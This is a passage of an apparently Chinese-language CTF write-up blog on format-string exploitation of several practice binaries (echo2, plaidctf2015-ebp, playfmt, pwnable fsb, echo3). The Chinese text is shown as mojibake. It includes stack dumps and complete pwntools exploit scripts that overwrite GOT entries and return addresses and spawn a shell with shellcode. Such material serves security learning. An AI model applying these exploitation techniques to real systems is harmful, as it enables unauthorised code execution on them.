class="hljs-number">0xfbad2087</span></code></pre></div><p>å‘ç°åœ¨<code>0x7fffffffe1e0</code>è¿™é‡Œå°±å¯ä»¥æ³„æ¼å‡ºpieåŸºå€äº†ï¼Œç¡®å®šåç§»æ˜¯34ã€‚ç„¶åå‰©ä¸‹çš„å°±ç®€å•äº†ï¼Œç›´æ¥idaé‡Œé¢æŸ¥çœ‹ä¸‹pltå’Œgot ï¼ŒåŠ ä¸Šä»¥åå°±å¾—åˆ°äº†çœŸæ­£çš„<br>pltå’Œgotåœ°å€ã€‚</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs c">from pwn import *context.log_level = 'debug'context.arch = 'amd64'io = process('./echo2')# io = remote('node3.buuoj.cn',28200)def leak1():    io.sendline('%34$p')    io.recvuntil('0x')    p_bass_addr = int((io.recv(9)+'000'),16)    return p_bass_addrp_bass_addr = leak1()print('p_bass_addr -&gt;' + hex(p_bass_addr))print_got = 0x201020 + p_bass_addrprint('print_got -&gt;' + hex(print_got))system_plt = 0x790 + p_bass_addrprint('system_plt -&gt;' + hex(system_plt))def fmt(prev,val,idx,byte = 2):    result = ""    if prev &lt; val :        result += "%" + str(val - prev) + "c"    elif prev == val :        result += ''    else :        result += "%" + str(256**byte - prev + val) + "c"    result += "%" + str(idx) + "$hn"    return resultprev = 0 payload = ""key = system_pltfor i in range(3):    payload +=fmt(prev,(key &gt;&gt; 16*i) &amp; 0xffff,14+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x40,'a') + flat([print_got,print_got+2,print_got+4])# raw_input('-&gt;')io.sendline(payload)sleep(0.1)io.sendline('/bin/sh\x00')io.interactive()</code></pre></div><p>-â€”  </p><p>** æ¥ä¸‹æ¥çš„é¢˜ï¼Œéƒ½æ˜¯bufä¸å†æ ˆçš„ä¸Šçš„é¢˜ç›®ã€‚**</p><h2 id="plaidctf2015-ebp"><a href="#plaidctf2015-ebp" class="headerlink" title="plaidctf2015-ebp"></a>plaidctf2015-ebp</h2><h3 id="ä¿æŠ¤å’Œarch-4"><a href="#ä¿æŠ¤å’Œarch-4" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs c">[*] '/media/psf/mypwn2/buuctf/plaidctf2015_ebp/ebp'    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre></div><p>å¯ä»¥çœ‹åˆ°nxä¿æŠ¤æ˜¯å…³é—­çš„ï¼Œå¯ä»¥æƒ³åŠæ³•åˆ©ç”¨shellcodeã€‚</p><h3 id="idaåˆ†æ-5"><a href="#idaåˆ†æ-5" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )  &#123;    result = (<span class="hljs-keyword">int</span>)fgets(buf, <span class="hljs-number">1024</span>, <span class="hljs-built_in">stdin</span>);    <span class="hljs-keyword">if</span> ( !result )      <span class="hljs-keyword">break</span>;    echo();  &#125;  <span class="hljs-keyword">return</span> result;&#125;</code></pre></div><p>æ¼æ´å‡½æ•°ï¼š</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">make_response</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">return</span> <span class="hljs-built_in">snprintf</span>(response, <span class="hljs-number">0x400</span>u, buf);&#125;</code></pre></div><p>ä»£ç ååˆ†ç®€å•ï¼Œä½†æ˜¯è¿™æ¬¡çš„æ¼æ´å‡½æ•°å˜æˆäº†snprintf ï¼Œæ—¶åˆ»æ³¨æ„åç§»çš„è®¡ç®—æ˜¯é’ˆå¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ã€‚ä¸”bufæ˜¯åœ¨bssæ®µä¸Šçš„ï¼Œå·²ç»å˜å¾—ä¸æ˜¯æˆ‘ä»¬å½“åˆä¸€æ ·ååˆ†çš„å¥½æ§åˆ¶ï¼Œæ­¤æ—¶å°±éœ€è¦æƒ³åŠæ³•å¥½å¥½åˆ©ç”¨æ ˆä¸ŠåŸæ¥æœ‰çš„æ•°æ®ã€‚</p><h3 id="gdbè°ƒè¯•-1"><a href="#gdbè°ƒè¯•-1" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h3><div class="hljs"><pre><code class="hljs html">gdb-peda$ stack 0x200000| 0xffffd320 --&gt; 0x804a480 --&gt; 0x00004| 0xffffd324 --&gt; 0x4000008| 0xffffd328 --&gt; 0x804a080 ("AAAA\n")0012| 0xffffd32c --&gt; 0xf7fd31b0 --&gt; 0xf7e00000 --&gt; 0x464c457f0016| 0xffffd330 --&gt; 0xf7fe77eb (<span class="hljs-tag">&lt;<span class="hljs-name">_dl_fixup+11</span>&gt;</span>:add    esi,0x15815)0020| 0xffffd334 --&gt; 0x00024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x00028| 0xffffd33c --&gt; 0x804852c (<span class="hljs-tag">&lt;<span class="hljs-name">echo+11</span>&gt;</span>:mov    DWORD PTR [esp],0x804a480)</code></pre></div><p>å¯ä»¥çœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µã€‚å¯ä»¥çœ‹åˆ°ä¸Šé¢æœ‰å¾ˆå¤šå¯ä»¥åˆ©ç”¨çš„åœ°å€ä¿¡æ¯ï¼Œå…¶ä¸­æœ€å¸¸ç”¨çš„ä¹Ÿæ˜¯ebpé“¾ ï¼š</p><div class="hljs"><pre><code class="hljs html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x0</code></pre></div><p><strong>ä¹Ÿå°±æ˜¯è¿™ä¸€ä¸ªï¼Œç¬¬ä¸€æ¬¡å¯ä»¥é€šè¿‡åˆ©ç”¨0xffffd338ï¼ˆebp1ï¼‰è¿™ä¸ªåœ°å€ï¼Œå…¶æŒ‡å‘0xffffd358 ï¼ˆebp2ï¼‰ï¼Œç„¶ååˆ©ç”¨<code>%xc%4$hhn</code> å°±å¯ä»¥ä¿®æ”¹0xffffd378ï¼ˆebp3ï¼‰ã€‚</strong><br><strong>å°†0xffffd378 æ”¹ä¸ºæŒ‡å‘ret addressçš„æ ˆåœ°å€  <code>0xffffd33c</code>  ï¼š</strong></p><div class="hljs"><pre><code class="hljs html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd33c --&gt; 0x804852c (<span class="hljs-tag">&lt;<span class="hljs-name">echo+11</span>&gt;</span>:mov    DWORD PTR [esp],0x804a480)0028| 0xffffd33c --&gt; 0x804852c (<span class="hljs-tag">&lt;<span class="hljs-name">echo+11</span>&gt;</span>:mov    DWORD PTR [esp],0x804a480)</code></pre></div><p>æ”¹å®Œä¹Ÿå°±æ˜¯è¿™æ ·çš„æ•ˆæœã€‚<br><strong>è¿™æ ·å°±åˆå¯ä»¥é€šè¿‡åˆ©ç”¨ 0xffffd358 ï¼ˆebp2ï¼‰ï¼Œå…¶æŒ‡å‘ 0xffffd33cï¼ˆebp3ï¼‰ï¼Œ</strong><br><strong>æ¥ç€å°±ç®—ä¸€ä¸‹0xffffd358 ï¼ˆebp2ï¼‰çš„åç§» yï¼Œç„¶ååˆ©ç”¨<code>%xc%y$hhn</code> å°±å¯ä»¥ä¿®æ”¹0x804852cï¼ˆret addressï¼‰</strong></p><p>è¿™æ ·æ”»å‡»æ€è·¯ä¹Ÿå°±å‡ºæ¥äº†ï¼Œå¯ä»¥ä¿®æ”¹retaddress ï¼Œè¿”å›åœ¨å¯æ§çš„buf ä¸Šé¢æ”¾å¥½shellcode ï¼Œæ§åˆ¶ç¨‹åºè·³åˆ°shellcodeå³å¯ã€‚</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timecontext.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./ebp'</span>)<span class="hljs-comment"># io = remote('node3.buuoj.cn',29994)</span>buf = <span class="hljs-number">0x0804a080</span> + <span class="hljs-number">0x40</span> <span class="hljs-comment">#0x804a0c0</span>raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(<span class="hljs-string">'%4$p'</span>)ret_stack_addr = int(io.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">28</span>print(<span class="hljs-string">'leak ret_stack_addr:'</span>+hex(ret_stack_addr))key1 = int(str(hex(ret_stack_addr))[<span class="hljs-number">-2</span>:],<span class="hljs-number">16</span>)key2 = <span class="hljs-number">0xa0c0</span>payload = <span class="hljs-string">'%&#123;&#125;c%4$hhn'</span>.format(key1)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recv()payload = <span class="hljs-string">'%&#123;&#125;c%12$hn'</span>.format(key2)payload = payload.ljust(<span class="hljs-number">0x40</span>) payload +=  asm(shellcraft.sh())io.sendline(payload)io.interactive()</code></pre></div><h2 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h2><h3 id="ä¿æŠ¤å’Œarch-5"><a href="#ä¿æŠ¤å’Œarch-5" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-string">[*]</span> <span class="hljs-string">'/media/psf/mypwn2/buuctf/hitcontraining_playfmt/playfmt'</span><span class="hljs-attr">    Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">    RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">    Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">    NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">disabled</span><span class="hljs-attr">    PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><span class="hljs-attr">    RWX:</span>      <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span></code></pre></div><p>æ²¡æœ‰ä»»ä½•ä¿æŠ¤ã€‚</p><h3 id="idaåˆ†æ-6"><a href="#idaåˆ†æ-6" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_fmt</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )  &#123;    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0xC8</span>u);    result = <span class="hljs-built_in">strncmp</span>(buf, <span class="hljs-string">"quit"</span>, <span class="hljs-number">4u</span>);    <span class="hljs-keyword">if</span> ( !result )      <span class="hljs-keyword">break</span>;    <span class="hljs-built_in">printf</span>(buf);  &#125;  <span class="hljs-keyword">return</span> result;&#125;</code></pre></div><p>ä¸Šå±‚æœ‰play å’Œ mainå‡½æ•°ï¼Œä¸€å…±ä¸‰å±‚ï¼Œåœ¨ç¬¬ä¸‰å±‚çš„è¿™ä¸ªå‡½æ•°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè®©æˆ‘ä»¬å¾ˆæ–¹ä¾¿çš„ç”¨ebpé“¾æ¥åšé¢˜ã€‚ç„¶åï¼Œæœ‰æ— é™æ¬¡çš„è§¦å‘è¿™ä¸ªæ¼æ´çš„æœºä¼šã€‚</p><p>æ”»å‡»æ€è·¯ ï¼šå› ä¸ºæ²¡æœ‰å¼€nxä¿æŠ¤ï¼Œä¹Ÿå°±ä»¥ä¸ºç€å¯ä»¥ç”¨shellcodeè¿›è¡Œæ”»å‡»ã€‚ç„¶åè¿˜æ˜¯æ”¹è¿”å›åœ°å€ï¼Œæå‰åœ¨å¯æ§çš„bufåˆé€‚çš„åœ°æ–¹æ‘†ä¸Šshellcodeï¼Œç„¶åè·³ä¸Šå»å³å¯ã€‚</p><h3 id="gdbåˆ†æ"><a href="#gdbåˆ†æ" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/84eq2e.png" srcset="/img/loading.gif" alt></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œåˆ©ç”¨è¿™ä¸ªé“¾å³å¯ã€‚å…ˆæƒ³åŠæ³•æŠŠ<code>Oxffffd358</code>  æ”¹æˆ <code>Oxffffd33c</code> :</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/HEOU3i.png" srcset="/img/loading.gif" alt></p><p>ç„¶ååœ¨æƒ³åŠæ³•æŠŠ0x8048507 è¿™ä¸ªè¿”å›åœ°å€æ”¹æˆæˆ‘ä»¬æ‘†æ”¾çš„shellcodeçš„åœ°å€å³å¯ã€‚</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timecontext.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./playfmt'</span>)<span class="hljs-comment"># io = remote('node3.buuoj.cn',26382)</span>buf = <span class="hljs-number">0x0804A060</span> + <span class="hljs-number">0x40</span> <span class="hljs-comment">#0x804a0a0</span>offset1 = <span class="hljs-number">6</span>offset2 = <span class="hljs-number">10</span>info(<span class="hljs-string">'---leak stack address---'</span>)io.recvuntil(<span class="hljs-string">'\n=====================\n'</span>)io.sendline(<span class="hljs-string">'%10$p'</span>)ret_stack_addr = int(io.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">28</span>print(<span class="hljs-string">'leak ret_stack_addr:'</span>+hex(ret_stack_addr))info(<span class="hljs-string">'---change the retaddr---'</span>)key = int(str(hex(ret_stack_addr))[<span class="hljs-number">-2</span>:],<span class="hljs-number">16</span>)payload = <span class="hljs-string">"%&#123;&#125;c%6$hhn"</span>.format(key)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)sleep(<span class="hljs-number">0.1</span>)io.recv()key2 = <span class="hljs-number">0xa0a0</span>payload = <span class="hljs-string">"%&#123;&#125;c%10$hn"</span>.format(key2)payload = payload.ljust(<span class="hljs-number">0x40</span>)payload += asm(shellcraft.sh())raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recv()sleep(<span class="hljs-number">0.1</span>)io.sendline(<span class="hljs-string">'quit'</span>)io.interactive()</code></pre></div><p>è®°å¾—å‘å‡ºå»ä¸€æ¬¡payloadï¼Œä¸€å®šéœ€è¦æ¥å—ä¸€æ¬¡ï¼Œå†å»å‘ç¬¬äºŒä¸ªpayloadï¼Œé˜²æ­¢æ²¡æœ‰å®Œæˆä¸€ä¸ªprintfï¼Œå°±è®©ç¨‹åºæ¥å—å‘é€çš„ä¸œè¥¿ï¼Œè¿™æ ·å®¹æ˜“å´©æºƒã€‚</p><h2 id="pwnable-fsb"><a href="#pwnable-fsb" class="headerlink" title="pwnable-fsb"></a>pwnable-fsb</h2><h3 id="archå’Œä¿æŠ¤"><a href="#archå’Œä¿æŠ¤" class="headerlink" title="archå’Œä¿æŠ¤"></a>archå’Œä¿æŠ¤</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><p>å¼€äº†nxäº†ã€‚</p><h3 id="idaåˆ†æ-7"><a href="#idaåˆ†æ-7" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">3</span>; ++k ) &#123;   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give me some format strings(%d)\n"</span>, k + <span class="hljs-number">1</span>);   read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x64</span>u);   <span class="hljs-built_in">printf</span>(buf); &#125; <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Wait a sec..."</span>); sleep(<span class="hljs-number">3u</span>);</code></pre></div><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ§åˆ¶äº†å¯ä»¥åˆ©ç”¨printfå‡½æ•°æ¼æ´çš„æ¬¡æ•°ï¼Œåªå¯ä»¥åˆ©ç”¨4æ¬¡ã€‚</p><div class="hljs"><pre><code class="hljs c">execve(path, &amp;path, <span class="hljs-number">0</span>);</code></pre></div><p>ä¸”è¿™ä¸€æ¡å¯ä»¥ç»™ä½ æ‹¿åˆ°shellã€‚</p><p>é‚£æ”»å‡»æ€è·¯å°±å¯ä»¥æ˜¯æ”¹æ‰putsï¼Œsleepçš„gotè¡¨ï¼Œåˆ°è¿™ä¸ªæ‹¿å–shellçš„ä½ç½®å°±è¡Œã€‚<br>å› ä¸ºè¿™é‡Œä¸‹é¢å°±è°ƒç”¨ä¸€æ¬¡sleepï¼Œå°±æ”¹å®ƒå¥½äº†ï¼ŒåŸºæœ¬ä¸ä¼šå‡ºé—®é¢˜ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/b41nYE.png" srcset="/img/loading.gif" alt><br>æ³¨æ„ä¸€ä¸‹è¿™é‡Œçš„æ±‡ç¼–ä»£ç ï¼Œå…¶ä¹Ÿæ˜¯è®©æ ˆçš„espå¤„äºä¸å®šçš„çŠ¶æ€ã€‚</p><h3 id="gdbåˆ†æ-1"><a href="#gdbåˆ†æ-1" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h3><p>æ­¤æ—¶çš„EBP = 0xffffd228 </p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0000</span>| <span class="hljs-number">0xffffd1e0</span> --&gt; <span class="hljs-number">0x804a100</span> (<span class="hljs-string">"AAAA\n"</span>)<span class="hljs-number">0004</span>| <span class="hljs-number">0xffffd1e4</span> --&gt; <span class="hljs-number">0x804a100</span> (<span class="hljs-string">"AAAA\n"</span>)<span class="hljs-number">0008</span>| <span class="hljs-number">0xffffd1e8</span> --&gt; <span class="hljs-number">0x64</span> (<span class="hljs-string">'d'</span>)<span class="hljs-number">0012</span>| <span class="hljs-number">0xffffd1ec</span> --&gt; <span class="hljs-number">0xf7f5b2a2</span> (<span class="hljs-string">"__vdso_clock_gettime"</span>)<span class="hljs-number">0016</span>| <span class="hljs-number">0xffffd1f0</span> --&gt; <span class="hljs-number">0xf7fe1fc9</span> (&lt;do_lookup_x+<span class="hljs-number">9</span>&gt;:add    ebx,<span class="hljs-number">0x1b037</span>)<span class="hljs-number">0020</span>| <span class="hljs-number">0xffffd1f4</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0024</span>| <span class="hljs-number">0xffffd1f8</span> --&gt; <span class="hljs-number">0xf7ffdad0</span> --&gt; <span class="hljs-number">0xf7ffda74</span> --&gt; <span class="hljs-number">0xf7fd3470</span> --&gt; <span class="hljs-number">0xf7ffd918</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0028</span>| <span class="hljs-number">0xffffd1fc</span> --&gt; <span class="hljs-number">0xffffd278</span> --&gt; <span class="hljs-number">0xf7e0b018</span> --&gt; <span class="hljs-number">0x3eab</span><span class="hljs-number">0032</span>| <span class="hljs-number">0xffffd200</span> --&gt; <span class="hljs-number">0xffffd2c0</span> --&gt; <span class="hljs-number">0x804a024</span> --&gt; <span class="hljs-number">0xf7ed6290</span> (&lt;close&gt;:cmp    DWORD PTR gs:<span class="hljs-number">0xc</span>,<span class="hljs-number">0x0</span>)<span class="hljs-number">0036</span>| <span class="hljs-number">0xffffd204</span> --&gt; <span class="hljs-number">0x8048870</span> (<span class="hljs-string">"/bin/sh"</span>)<span class="hljs-number">0040</span>| <span class="hljs-number">0xffffd208</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0044</span>| <span class="hljs-number">0xffffd20c</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0048</span>| <span class="hljs-number">0xffffd210</span> --&gt; <span class="hljs-number">0xffffd4a4</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0052</span>| <span class="hljs-number">0xffffd214</span> --&gt; <span class="hljs-number">0xffffdfce</span> --&gt; <span class="hljs-number">0x656d2f00</span> (<span class="hljs-string">''</span>)<span class="hljs-number">0056</span>| <span class="hljs-number">0xffffd218</span> --&gt; <span class="hljs-number">0xffffd230</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0060</span>| <span class="hljs-number">0xffffd21c</span> --&gt; <span class="hljs-number">0xffffd234</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0064</span>| <span class="hljs-number">0xffffd220</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0068</span>| <span class="hljs-number">0xffffd224</span> --&gt; <span class="hljs-number">0x1</span><span class="hljs-number">0072</span>| <span class="hljs-number">0xffffd228</span> --&gt; <span class="hljs-number">0xffffd378</span> --&gt; <span class="hljs-number">0x0</span></code></pre></div><p>å¯ä»¥çœ‹åˆ°ï¼Œå› ä¸ºè¿™ä¸ªé¢˜æ˜¯main -&gt; fsb ,ç”¨æˆ·ä»£ç åªæœ‰2å±‚å‡½æ•°çš„è°ƒç”¨ï¼Œçœ‹è¿™ä¸ªebp chainçš„æ—¶å€™å°±æœ‰ç‚¹ä¸æ–¹ä¾¿äº†ï¼Œæˆ‘ä»¬æ²¡æœ‰ä¸€ä¸ªå®Œæ•´çš„chainæ¥ä½¿ç”¨ã€‚è¿™ä¸ªæ—¶å€™ï¼Œå°±åªèƒ½æŠŠebp3 çš„å€¼ï¼Œè‡ªå·±å†™ä¸Šå»ï¼Œå†™ä¸Šsleepçš„gotç„¶åå†æ”¹æˆæ‹¿shellçš„åœ°å€å°±è¡Œäº†ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/Bb3DnD.png" srcset="/img/loading.gif" alt><br><strong>æ•´ä¸ªè¿‡ç¨‹è¿˜æ˜¯éœ€è¦æ³„æ¼ä¸€ä¸‹æ ˆåœ°å€espï¼Œå› ä¸ºå…¶æ ˆæ˜¯å˜åŒ–çš„ã€‚æ³„éœ²ä»¥åï¼Œä¹Ÿè·å–ä¸€ä¸‹ebp2çš„å€¼ï¼Œç„¶åï¼ˆebp2- esp ï¼‰/4 ä¹Ÿå°±ç¡®å®šåˆ°äº†ï¼Œmainçš„ebpå€¼ï¼ˆebp3ï¼‰å¯¹åº”æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»å€¼ã€‚</strong>ç„¶åå†æ¬¡åˆ©ç”¨printfå‡½æ•°æ ¹æ®è¿™ä¸ªåç§»æ¥è¿›è¡Œæ”¹å†™sleep gotä¸Šçš„å€¼ã€‚</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timecontext.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./fsb'</span>)<span class="hljs-comment"># s = ssh(</span><span class="hljs-comment">#     host="pwnable.kr",</span><span class="hljs-comment">#     port=2222,</span><span class="hljs-comment">#     user="fsb",</span><span class="hljs-comment">#     password="guest"</span><span class="hljs-comment"># )</span><span class="hljs-comment"># io = s.run("/home/fsb/fsb")</span><span class="hljs-comment"># io = shell.run("/home/fsb/fsb")</span>sleep_got = <span class="hljs-number">0x0804a008</span>info(<span class="hljs-string">'--------leak stack base:-------'</span>)io.recvuntil(<span class="hljs-string">'strings(1)\n'</span>)io.sendline(<span class="hljs-string">'%14$p'</span>)io.recvuntil(<span class="hljs-string">'0x'</span>)stack_base = int(io.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">80</span>print(hex(stack_base))info(<span class="hljs-string">'--------leak the point to main ebp:-------'</span>)io.recvuntil(<span class="hljs-string">'strings(2)\n'</span>)io.sendline(<span class="hljs-string">'%18$p'</span>)io.recvuntil(<span class="hljs-string">'0x'</span>)point = int(io.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)print(hex(point))info(<span class="hljs-string">'--------write sleep_got to main_ebp :-------'</span>)io.recvuntil(<span class="hljs-string">'strings(3)\n'</span>)key1 = <span class="hljs-number">0x0804A008</span>payload = <span class="hljs-string">'%'</span> + str(key1) + <span class="hljs-string">'c%18$n'</span>io.sendline(payload)info(<span class="hljs-string">'--------write tag to sleep_got :-------'</span>)tag = <span class="hljs-number">0x869F</span>offset = (point - stack_base) / <span class="hljs-number">4</span>payload = <span class="hljs-string">"%&#123;&#125;c%'str(offset)'$hn "</span>.format(tag)io.recvuntil(<span class="hljs-string">'strings(4)\n'</span>)io.sendline(payload)io.interactive()</code></pre></div><h2 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h2><h3 id="ä¿æŠ¤å’Œarch-6"><a href="#ä¿æŠ¤å’Œarch-6" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><h3 id="idaåˆ†æ-8"><a href="#idaåˆ†æ-8" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt><br>è¿™ä¸€å¤„ä¼šè®©æ ˆçš„æƒ…å†µå˜å¾—æ— æ³•é¢„æµ‹ã€‚ç„¶åè¿›å…¥hardfmtï¼š</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )&#123;  read(<span class="hljs-number">0</span>, buff, <span class="hljs-number">0x1000</span>u);  <span class="hljs-built_in">printf</span>(buff);&#125;</code></pre></div><p>è¿™ä¸€å¤„å­˜åœ¨æ¼æ´ï¼Œä¸”å¾€ä¸‹çœ‹æ„Ÿè§‰æ²¡ä»€ä¹ˆå¥½åˆ©ç”¨çš„ï¼Œæ²¡ä»€ä¹ˆæ¼æ´å‡½æ•°ã€‚é‚£æ”»å‡»æ€è·¯å°±æ˜¯ï¼šæ”¹printfçš„gotè¡¨ï¼Œç„¶ååœ¨ç¬¬5æ¬¡ä¼ è¿‡å»<code>/bin/sh</code>å³å¯ã€‚<br>ï¼ˆè¿™ä¸ªé¢˜ç›®æ€è·¯è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œä½†æ˜¯å› ä¸ºè¿™ä¸ªæ¬¡æ•°çš„é™åˆ¶ï¼Œåœ¨å®é™…æ“ä½œè¿‡ç¨‹ä¸­ï¼Œè¦å……åˆ†çš„åˆ©ç”¨æ¯ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚ï¼‰</p><h3 id="gdbåˆ†æ-2"><a href="#gdbåˆ†æ-2" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h3><p>å› ä¸ºæ ˆæƒ…å†µä¸ä¸€æ ·ï¼Œå¯ä»¥é€‰æ‹©æœ€é€‚åˆæˆ‘ä»¬åˆ©ç”¨æ¼æ´çš„æ ˆç©ºé—´ï¼Œè¿™æ ·åšèµ·æ¥ä¼šç®€å•ä¸€äº›ã€‚</p><p>æˆ‘è‡ªå·±é€‰æ‹©åœ¨åç§»åœ¨43çš„æ—¶å€™å¼€å§‹è¿›è¡Œåˆ†æï¼Œæƒ³åŠæ³•æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" 